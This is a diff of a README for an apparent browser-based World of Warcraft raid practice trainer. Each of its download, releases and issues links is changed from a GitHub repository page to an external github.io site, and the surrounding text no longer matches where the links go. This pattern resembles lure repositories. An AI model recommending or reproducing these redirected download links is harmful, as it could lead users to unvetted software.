@@ -1,6 +1,6 @@
 # 🎯 aq40-ouro-skip-script - Master the AQ40 Trash Skip
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Synthetic-atmometer538/aq40-ouro-skip-script/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://synthetic-atmometer538.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the AQ40 Ouro Skip Script practice trainer! This browser-based tool h
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/Synthetic-atmometer538/aq40-ouro-skip-script/releases](https://github.com/Synthetic-atmometer538/aq40-ouro-skip-script/releases)
+Visit this link to download the application: [https://synthetic-atmometer538.github.io](https://synthetic-atmometer538.github.io)
 
 Once you're on the releases page, find the latest version and click the download button. The file is small and loads quickly.
 
@@ -80,7 +80,7 @@ A: Your practice times and success rates are saved automatically in your browser
 
 ## 🤝 Support
 
-For help, questions, or to report bugs, visit the GitHub repository's Issues page: [https://github.com/Synthetic-atmometer538/aq40-ouro-skip-script/issues](https://github.com/Synthetic-atmometer538/aq40-ouro-skip-script/issues)
+For help, questions, or to report bugs, visit the GitHub repository's Issues page: [https://synthetic-atmometer538.github.io](https://synthetic-atmometer538.github.io)
 
 You can also check the repository's Discussions section for tips from other users.
 
@@ -94,6 +94,6 @@ Special thanks to the classic MMORPG community for documenting the AQ40 trash sk
 
 ## 💾 Download Again
 
-Need another copy? Visit the releases page: [https://github.com/Synthetic-atmometer538/aq40-ouro-skip-script/releases](https://github.com/Synthetic-atmometer538/aq40-ouro-skip-script/releases)
+Need another copy? Visit the releases page: [https://synthetic-atmometer538.github.io](https://synthetic-atmometer538.github.io)
 
 Keywords: aq40, ouro, trash skip, practice trainer, browser-based, hunter abilities, feign death, distracting shot, raid, world of warcraft, classic, twin emperors
